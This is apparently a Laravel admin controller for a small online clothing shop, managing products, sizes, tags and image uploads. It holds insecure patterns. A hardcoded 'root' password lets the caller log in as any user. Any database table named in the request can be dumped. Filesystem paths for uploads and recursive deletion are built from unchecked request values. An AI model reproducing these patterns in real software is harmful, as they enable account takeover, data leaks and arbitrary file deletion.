<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use Illuminate\Support\Facades\Schema;
use DB;
use Storage;

use Illuminate\Support\Facades\Auth;

class Admin extends Controller
{
    /**
     * Handle the incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function __invoke(Request $request)
    {
        //
    }


    public function central(Request $req){
        $table= $req->section;
        $columns = Schema::getColumnListing($table);
        $entries = DB::table($table)->get();

        return view('cms.central')->with(['columns'=>$columns,'entries'=>$entries,'table'=>$table]);
    }

    public function produse(Request $req){

        $columns = Schema::getColumnListing("Products");
        $entries = DB::table('Products')->get();

        return view('produse')->with(['columns'=>$columns,'entries'=>$entries]);
    }

    public function details(Request $req){

        $table = $req->table;
        $keycode = $req->keycode;
        $key = $req->key;
     

        switch($table){
            case 'Products':{


                return self::Products($key);
            }break;
            default:{
                print_r($_GET);
                return ;
            }
        }


    }


    private function Products($primary_key){
        $columns_prod = Schema::getColumnListing('Products');
        $product = DB::table('Products')->where('product_id',$primary_key)->first();
        $sizes = DB::table('Product_sizes')->where('product_id',$primary_key)->join('Sizes','Sizes.size_id','=','Product_sizes.size_id')->get();
      
        $tags = DB::table('Products_tags')->where('product_id',$primary_key)->join('Tags','Products_tags.tag_id','=','Tags.id')->get();
      
        return view('cms.produse')->with(['columns_prod'=>$columns_prod,'prod'=>$product,'sizes'=>$sizes,'tags'=>$tags]);
    }

    public function getTags(){
        return response()->json(DB::table('Tags')->get());
    }

    public function createprods(Request $req){
        try{
        $size_ids =  explode(',', $req->size_ids);
            $size_qts = explode(',',$req->size_qt);
            
            $tags =  explode(',', $req->tags);

            var_dump($_FILES);
      
        if(count($size_ids) != count($size_qts))
            throw new Exception(">> marimile si cantitatile nu coincid");

     $product_id =    DB::table('Products')->insertGetId([
            'product_type_code'=>$req->product_type_code,
            'product_name'=>$req->product_name,
            'product_price'=>$req->product_price,
            'product_new_price'=>$req->product_new_price,
            'product_description'=>$req->product_description
        ]);


      //  $req->file("")->move(base_path('/public/images/products/product_'.$product_id), "$i.png");
       
        for($i = 1; $i <6 && $product_id >0 ; $i++){
            $prop = "product_image".($i==1?"":$i)."_small";
            $file_small = $req->file($prop);
         /*   if($file_small)
            Storage::disk('images')->putFileAs('products/product_'.$product_id."/small",$file_small,"$i.png");
       /*/   //  (base_path('/public/images/products/product_'.$product_id."/small"."/$i.png"), $req->file($prop));
            
//var_dump($req->$prop);
         //   var_dump(  move_uploaded_file( $_FILES[$prop]["tmp_name"],base_path('/public/images/products/product_'.$product_id."/small"."/$i.png")));
           if($file_small)
           $file_small->storeAs('products/product_'.$product_id."/small", "$i.png",'images');
                //  $file_small->move(base_path('/public/images/products/product_'.$product_id."/small"), "$i.png");
            $prop = ('product_image'.($i==1?"":$i)."_large");
            $file_large= $req->file($prop);
           // var_dump(  move_uploaded_file( $_FILES[$prop]["tmp_name"],'/public/images/products/product_'.$product_id."/$i.png"));
        
            if($file_large) 
                 $file_large->storeAs('products/product_'.$product_id."", "$i.png", 'images');
          
                // $file_large->move(base_path('/public/images/products/product_'.$product_id), "$i.png");
            if($file_small && $file_large)
             DB::table('Products')->where('product_id',$product_id)->update(['product_image'.($i==1?"":$i)=>"$i.png"]);
           
        }

        if($product_id > 0){
            foreach($tags as $tag){
                if(!!DB::table('Tags')->where('id',$tag)->first())
                    DB::table('Products_tags')->insertGetId(['product_id'=>$product_id,'tag_id'=>$tag]);
            }

            
            for($i = 0; $i < count($size_qts); $i++){

                if(!!DB::table('Sizes')->where('size_id',$size_ids[$i])->first())
                    DB::table('Product_sizes')->insertGetId(['product_id'=>$product_id,'size_id'=>$size_ids[$i],'Quantity_AV'=>$size_qts[$i]]);
            }
        }else{
            return response()->json(['scs'=>false,'reason'=>'Product ID e null']);
        }

    }catch(Exception $e){

        return response()->json(['scs'=>false,'reason'=>$e->getMessage()]);
    }

        return response()->json(['scs'=>true,'reason'=>""]);

    }


    public function updateprods(Request $req){
        try{
        for($i = 1; $i <6; $i++){
            $prop = "product_image".($i==1?"":$i)."_small";
            $file_small = $req->file($prop);
           // Storage::put("/app/1.png", $req->file($req->$prop));
         
//var_dump($req->$prop);
  //        var_dump(  move_uploaded_file( $_FILES[$prop]["tmp_name"],"/1.png"));
            if($file_small)  $file_small->move(base_path('/public/images/products/product_'.$req->product_id."/small"), "$i.png");
            $prop = ('product_image'.($i==1?"":$i)."_large");
            $file_large= $req->file($prop);
            if($file_large)  $file_large->move(base_path('/public/images/products/product_'.$req->product_id), "$i.png");
            if($file_small && $file_large)
             DB::table('Products')->where('product_id',$req->product_id)->update(['product_image'.($i==1?"":$i)=>"$i.png"]);
           
        }

         DB::table('Products')->where('product_id',$req->product_id)->update([
             'product_type_code'=>$req->product_type_code,
             'product_name'=>$req->product_name,
             'product_price'=>$req->product_price,
             'product_new_price'=>$req->product_new_price,
             'product_description'=>$req->product_description
         ]);
         }catch(Exception $e){
            return response()->json(['scs'=>false,'reason'=>$e->getMessage()]);
         }


         return response()->json(['scs'=>true,'reason'=>""]);


         // return redirect()->intended('http://localhost:8001/admin/details?table=Products&kn=product_id&key='.$req->product_id);
        
    }

    public function activateSU(Request $req){
        $id = $req->target;
        $usr = $req->user;
        $password = $req->password;
        if($usr == "root" && $password == "!QA@WSEDZXC"){
            $req->session()->put('SU', 1);
            Auth::logout();
             Auth::loginUsingId($id);

             return redirect()->intended('');
        }else{
            return abort(404);
        }
    }
    public function delprod(Request $req){
        try{
            self::deleteDir("images/products/product_".$req->key);
            DB::table('Products_tags')->where('product_id',$req->key)->delete();
            DB::table('Product_sizes')->where('product_id',$req->key)->delete();
            DB::table('Products')->where('product_id',$req->key)->delete();
        }catch(Exception $e){

        }
        return redirect()->intended('/admin/central?section=Products');
    }

    public static function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new \Exception("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
}
